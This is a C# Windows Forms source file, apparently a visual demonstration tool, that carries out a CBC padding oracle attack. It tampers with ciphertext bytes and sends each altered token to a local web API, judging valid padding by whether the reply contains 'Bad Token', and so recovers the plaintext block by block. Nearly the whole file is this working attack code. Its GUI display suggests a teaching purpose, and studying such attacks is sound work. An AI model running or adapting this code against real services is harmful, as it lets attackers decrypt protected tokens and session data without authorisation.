using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AttackerVisual
{
	public partial class PadVisual : Form
	{
		public PadVisual()
		{
			InitializeComponent();
		}

		private void txtEncryptedToken_TextChanged( object sender, EventArgs e )
		{

		}

		private void btnBegin_Click( object sender, EventArgs e )
		{
			var blockSize = 16;
			var freqs = MakeGeneralFrequency();

			byte[] origBytes = StringToByteArray( txtEncryptedToken.Text );

			var plainText = new List<byte>();
			var totalBlocks = origBytes.Length / blockSize;

			txtFullPlainText.Text = "";
			for ( var blockIndex = 0; blockIndex < totalBlocks - 1; blockIndex++ )
			{
				txtEncryptedToken.SelectionStart = (blockSize * blockIndex) * 2;
				txtEncryptedToken.SelectionLength = blockSize * 4;
				txtEncryptedToken.Select();

				txtC1.Text = txtEncryptedToken.Text.Substring( ( blockSize * blockIndex ) * 2, blockSize * 2 );
				txtC2.Text = txtEncryptedToken.Text.Substring( ( blockSize * ( blockIndex + 1) ) * 2, blockSize * 2 );
				Application.DoEvents();

				var blockBytes = origBytes.Skip( blockSize * blockIndex ).Take( blockSize * 2 ).ToArray();
				plainText.AddRange( DecryptBlock( blockSize, blockBytes.ToArray(), freqs ) );
				txtFullPlainText.Text = Encoding.ASCII.GetString( plainText.ToArray() );
				Application.DoEvents();
			}
		}

		private static byte[] XorByteLists( List<byte> block1, List<byte> block2 )
		{
			if ( block1.Count != block2.Count ) throw new ArgumentException( "block lengths are different" );

			var returnBytes = new byte[ block2.Count ];
			for ( var i = 0; i < block2.Count; i++ )
			{
				returnBytes[ i ] = (byte)( block1[ i ] ^ block2[ i ] );
			}
			return returnBytes;
		}

		public static byte[] StringToByteArray( String hex )
		{
			int NumberChars = hex.Length;
			byte[] bytes = new byte[ NumberChars / 2 ];
			for ( int i = 0; i < NumberChars; i += 2 )
			{
				bytes[ i / 2 ] = Convert.ToByte( hex.Substring( i, 2 ), 16 );
			}
			return bytes;
		}

		public static string ByteArrayToString( byte[] ba )
		{
			StringBuilder hex = new StringBuilder( ba.Length * 2 );
			foreach ( byte b in ba )
			{
				hex.AppendFormat( "{0:x2}", b );
			}
			return hex.ToString();
		}

		static string MakeGeneralFrequency()
		{
			string freq = "|0123456789etaionsrlhdcumpfgybwETAIONS";
			AddASCIIRange( ref freq, 97, 122 );
			AddASCIIRange( ref freq, 65, 90 );
			AddASCIIRange( ref freq, 0, 255 );
			return freq;
		}

		static void AddASCIIRange( ref string freq, int start, int end )
		{
			for ( var i = start; i <= end; i++ )
			{
				var c = (char)i;
				if ( !freq.Contains( c ) )
				{
					freq += c;
				}
			}
		}


		List<byte> DecryptBlock( int blockSize, byte[] cipherBytes, string freq )
		{
			txtBlockPlaintext.Text = new String( ' ', blockSize * 2 );

			var returnBytes = new List<byte>();
			List<byte> byteListModified = new List<byte>( cipherBytes );

			string plainText = "";
			var iPrime = new List<byte>();
			for ( var fiddlePos = blockSize - 1; fiddlePos >= 0; fiddlePos-- )
			{

				for ( var attempt = 0; attempt < 256; attempt++ )
				{
					var paddingValue = (byte)( blockSize - fiddlePos );

					/////
					var padText = "";
					for ( var i = 0; i < blockSize - iPrime.Count() -1; i++ )
					{
						padText += "  ";
					}
					for ( var i = iPrime.Count(); i >= 0; i-- )
					{
						padText += String.Format( "{0:x2}", paddingValue );
					}
					txtFakeP1.Text = padText;
					Application.DoEvents();
					////

					var fiddleByte = attempt;
					if ( chkCustomFreq.Checked )
					{
						fiddleByte = ( blockSize - fiddlePos ) ^ cipherBytes[ fiddlePos ] ^ freq[ attempt ];
					}
					byteListModified[ fiddlePos ] = (byte)fiddleByte;
					
					var newToken = ByteArrayToString( byteListModified.ToArray() );
					var isValid = isValidPadding( newToken );
					var millisecondsBetweenRequests = Convert.ToInt32( txtDelayMs.Value );
					if ( millisecondsBetweenRequests != 0 )
					{
						System.Threading.Thread.Sleep( millisecondsBetweenRequests );
					}

					// prevent false positive on last byte of a padded block
					if ( isValid && fiddlePos == blockSize - 1 )
					{
						byteListModified[ fiddlePos - 1 ] = (byte)( byteListModified[ fiddlePos - 1 ] ^ 1 );
						newToken = ByteArrayToString( byteListModified.ToArray() );
						isValid = isValidPadding( newToken );
					}

					if ( isValid )
					{
						var i2 = (byte)fiddleByte ^ paddingValue;
						iPrime.Add( (byte)i2 );
						var c2 = i2 ^ cipherBytes[ fiddlePos ];
						plainText = (char)c2 + plainText;
						returnBytes.Insert( 0, (byte)c2 );

						var primeCounter = 0;
						for ( var tail = blockSize - 1; tail >= fiddlePos; tail-- )
						{
							var vvv = iPrime[ primeCounter++ ];
							var nextPadding = paddingValue + 1;
							byteListModified[ tail ] = (byte)( vvv ^ nextPadding );
						}

						//////
						var i2Text = "";
						for ( var i = 0; i < blockSize - iPrime.Count(); i++ )
						{
							i2Text += "  ";
						}
						for ( var i = iPrime.Count()-1; i >= 0; i-- )
						{
							i2Text += String.Format( "{0:x2}", iPrime[ i ] );
						}
						txtI2.Text = i2Text;

						txtBlockPlaintext.Text = "";
						for ( var i = 0; i < blockSize - plainText.Length; i++ )
						{
							txtBlockPlaintext.Text += "  -";
						}
						for ( var i = 0; i < plainText.Length; i++ )
						{
							txtBlockPlaintext.Text += " " + plainText[ i ];
							if ( txtBlockPlaintext.Text.Length < blockSize * 2 ) txtBlockPlaintext.Text += "-";
						}
						Application.DoEvents();
						//////

						break;
					}

					///////////////
					// bad approach to updating UI while processing, but just to make it quick & easy:
					txtC1Prime.Text = ByteArrayToString( byteListModified.ToArray() );

					///////////////

					Application.DoEvents();

				}
			}
			return returnBytes;
		}

		bool isValidPadding( string token )
		{
			var UrlPrefix = "http://localhost:55165/api/transaction?ticket=";

			var requestUrl = UrlPrefix + token;
			var request = WebRequest.Create( requestUrl );

			var isValidPadding = false;
			var response = request.GetResponse();
			using ( Stream dataStream = response.GetResponseStream() )
			{
				using ( StreamReader reader = new StreamReader( dataStream ) )
				{
					var responseFromServer = reader.ReadToEnd();
					txtServerResponse.Text = responseFromServer;
					isValidPadding = !responseFromServer.Contains( "Bad Token" );
					if ( isValidPadding ) {
						txtServerResponse.BackColor = Color.Green;
					}
					else
					{
						txtServerResponse.BackColor = Color.Red;
					}

				}
			}
			RequestCounter++;
			return isValidPadding;
		}
		static long RequestCounter = 0;

		static byte[] zeroIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };

	}
}
